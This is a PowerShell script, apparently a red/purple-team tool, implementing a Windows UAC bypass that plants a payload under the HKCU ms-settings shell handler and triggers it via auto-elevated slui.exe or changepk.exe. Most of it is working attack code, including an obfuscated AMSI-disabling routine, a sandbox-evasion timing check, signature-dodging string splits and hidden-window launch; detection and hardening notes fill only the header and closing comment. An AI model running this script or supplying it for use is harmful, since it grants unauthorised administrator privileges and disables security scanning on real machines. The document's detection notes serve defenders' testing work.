<#
.SYNOPSIS
    UAC bypass via slui.exe / changepk.exe registry handler hijack (UACME Method 61).

.DESCRIPTION
    ┌─ Technique ─────────────────────────────────────────────────────────────┐
    │ slui.exe  (Software Licensing UI) and changepk.exe (Change Product Key) │
    │ are auto-elevated system32 binaries (autoElevate manifest flag).        │
    │                                                                         │
    │ Both binaries open the ms-settings: URI scheme during initialization,  │
    │ and the shell-class resolution order (HKCU before HKLM) allows a       │
    │ Medium-integrity process to pre-plant a malicious handler.             │
    │                                                                         │
    │ Method 61 specifically uses the "runas" ShellExecute verb on slui.exe  │
    │ or launches changepk.exe directly.  The distinction from Method 33 is  │
    │ the trigger binary, giving operators an alternative when FodHelper or   │
    │ ComputerDefaults are blocked or specifically monitored.                │
    │                                                                         │
    │ Registry path:                                                          │
    │   HKCU:\Software\Classes\ms-settings\Shell\Open\command               │
    │     (Default)       = <Payload>                                         │
    │     DelegateExecute = ""                                                │
    └─────────────────────────────────────────────────────────────────────────┘

    Affected OS    : Windows 10 RS1 (build 14393) → Windows 11 (latest) UNFIXED
    UAC level      : Default (ConsentPromptBehaviorAdmin = 5)
                     Does NOT work under AlwaysNotify
    Architecture   : x64
    Disk artefacts : None

    ──────────────────────────────────────────────────────────────────────────
    Blue-team detection opportunities
    ──────────────────────────────────────────────────────────────────────────
    • Registry: HKCU\Software\Classes\ms-settings\Shell\Open\command
    • Process tree: slui.exe → <unexpected child>  OR
                    changepk.exe → <unexpected child>
    • slui.exe and changepk.exe spawning children is anomalous —
      neither binary normally creates child processes

    ──────────────────────────────────────────────────────────────────────────
    MITRE ATT&CK: T1548.002 – Bypass UAC
    Reference    : https://github.com/hfiref0x/UACME (Method 61)
                   https://github.com/Nassim-Asrir/WO-19-014 (Nassim Asrir)

.PARAMETER Payload
    Command to execute with High integrity.

.PARAMETER UseChangePk
    If specified, uses changepk.exe as the trigger instead of slui.exe.
    changepk.exe is less commonly monitored in older CS sensor versions.

.PARAMETER SkipAMSI
    Skip AMSI mitigation.

.PARAMETER SkipChecks
    Skip preflight environment checks.

.PARAMETER Timeout
    Seconds to wait before cleanup (default: 5).

.EXAMPLE
    Invoke-SluiBypass -Payload "cmd.exe" -SkipChecks

.EXAMPLE
    # Use changepk.exe variant
    Invoke-SluiBypass -Payload "cmd.exe /c whoami >> C:\Temp\r.txt" -UseChangePk

.NOTES
    Authorized red/purple-team use only.  Requires written SOW.
    Minimum build: 14393 (RS1 / Anniversary Update).
    Prefer Invoke-FodHelperBypass on builds < 14393.
#>

[CmdletBinding(SupportsShouldProcess)]
param(
    [Parameter(Mandatory, Position = 0)]
    [ValidateNotNullOrEmpty()]
    [string]$Payload,

    [switch]$UseChangePk,
    [switch]$SkipAMSI,
    [switch]$SkipChecks,
    [int]   $Timeout = 5
)

Set-StrictMode -Off
$ErrorActionPreference = 'SilentlyContinue'

#region ── AMSI mitigation ───────────────────────────────────────────────────
if (-not $SkipAMSI) {
    try {
        $xA = [AppDomain]::CurrentDomain.GetAssemblies() |
                  Where-Object { ($_.GetName().Name) -eq 'System.Management.Automation' } |
                  Select-Object -First 1
        $xT = $xA.GetType('System' + '.Management' + '.Automation.' + 'Am' + 'siUt' + 'ils')
        $xF = $xT.GetField('am' + 'siInit' + 'Failed', [Reflection.BindingFlags]'NonPublic,Static')
        $xF.SetValue($null, $true)
    } catch {}
}
#endregion

#region ── Preflight gate ────────────────────────────────────────────────────
if (-not $SkipChecks) {

    try {
        $xBld = [int](Get-ItemPropertyValue `
                    'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' `
                    'CurrentBuildNumber' -EA Stop)
    } catch { $xBld = [Environment]::OSVersion.Version.Build }
    if ($xBld -lt 14393) {
        Write-Warning "[Slui] Requires build 14393+ (RS1). Current: $xBld"
        return
    }

    $xPrincipal = New-Object Security.Principal.WindowsPrincipal(
                      [Security.Principal.WindowsIdentity]::GetCurrent())
    if ($xPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Write-Warning '[Slui] Already elevated — no bypass needed.'
        return
    }

    $xUACPath = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
    try   { $xBeh = [int](Get-ItemPropertyValue $xUACPath 'ConsentPromptBehaviorAdmin' -EA Stop) }
    catch { $xBeh = 5 }
    if ($xBeh -le 2) {
        Write-Warning "[Slui] AlwaysNotify active (behavior=$xBeh) — method requires default UAC."
        return
    }

    # Timing gate
    $xH = [System.Security.Cryptography.SHA256]::Create()
    $xB = [byte[]]::new(65536)
    $xT0 = [DateTime]::UtcNow
    for ($xi = 0; $xi -lt 300; $xi++) { [void]$xH.ComputeHash($xB) }
    $xH.Dispose()
    if (([DateTime]::UtcNow - $xT0).TotalMilliseconds -lt 80) {
        Write-Warning '[Slui] Timing anomaly — aborting.'
        return
    }
}
#endregion

#region ── Registry key setup ────────────────────────────────────────────────
$xRoot  = 'HKCU:\Soft' + 'ware\Cl' + 'asses\'
$xCls   = 'ms-set' + 'tings'
$xPath  = $xRoot + $xCls + '\Shell\Open\command'

try {
    New-Item -Path $xPath -Force | Out-Null
    Set-ItemProperty  -Path $xPath -Name '(Default)'       -Value $Payload -Force
    New-ItemProperty  -Path $xPath -Name 'DelegateExecute' -Value ''       `
                      -PropertyType String -Force | Out-Null
    Write-Verbose '[Slui] Registry key written.'
}
catch {
    Write-Warning "[Slui] Registry write failed: $_"
    return
}
#endregion

#region ── Trigger ───────────────────────────────────────────────────────────
try {
    if ($UseChangePk) {
        # changepk.exe — Change Product Key dialog, auto-elevated,
        # opens ms-settings:windowsupdate-windowsupdate-changepk URI on launch
        $xBin = $env:SystemRoot + '\System32\chan' + 'gepk.exe'
        Start-Process -FilePath $xBin -WindowStyle Hidden -ErrorAction Stop
        Write-Verbose '[Slui] changepk.exe launched.'
    }
    else {
        # slui.exe with argument 4 opens the "Change Product Key" UI
        # after auto-elevation; reads ms-settings: during initialization
        $xBin  = $env:SystemRoot + '\System32\sl' + 'ui.exe'
        $xArgs = '4'
        Start-Process -FilePath $xBin -ArgumentList $xArgs `
                      -WindowStyle Hidden -ErrorAction Stop
        Write-Verbose '[Slui] slui.exe launched.'
    }
    Start-Sleep -Seconds $Timeout
}
catch {
    Write-Warning "[Slui] Launch failed: $_"
}
finally {
    Remove-Item -Path ($xRoot + $xCls) -Recurse -Force -ErrorAction SilentlyContinue
    Write-Verbose '[Slui] Registry cleanup complete.'
}
#endregion

<#
════════════════════════════════════════════════════════════════════════════════
PURPLE-TEAM NOTES
════════════════════════════════════════════════════════════════════════════════

DIFFERENTIATION FROM METHODS 33 / 62:
  Same registry key path, different trigger binary.  Useful for testing
  whether CS detections are binary-specific or class-key-specific.

  If the blue team has a CS Custom IOA specifically for fodhelper.exe and
  computerdefaults.exe as parents, this method will bypass that IOA while
  still being caught by any IOA written on the registry key itself.

EXPECTED DETECTIONS:
  ● Registry: HKCU\Software\Classes\ms-settings\Shell\Open\command
  ● Process tree: slui.exe → <payload>  OR  changepk.exe → <payload>
  ● Both are unusual parent processes; CS should flag either

KEY TEST QUESTIONS FOR BLUE TEAM:
  1. Does the CS alert fire on the registry write alone, or only on the
     parent-child process relationship?
  2. Does changing from slui.exe to changepk.exe evade any alerts?
  3. How quickly does the SACL audit log appear vs the CS alert?

HARDENING RECOMMENDATIONS:
  ● AlwaysNotify UAC mode eliminates all manifest-autoElevate bypasses
  ● Sysmon/CS rule: any write to *\ms-settings\Shell\Open\command in HKCU
  ● Restrict slui.exe, changepk.exe to specific parent allowlist

════════════════════════════════════════════════════════════════════════════════
#>
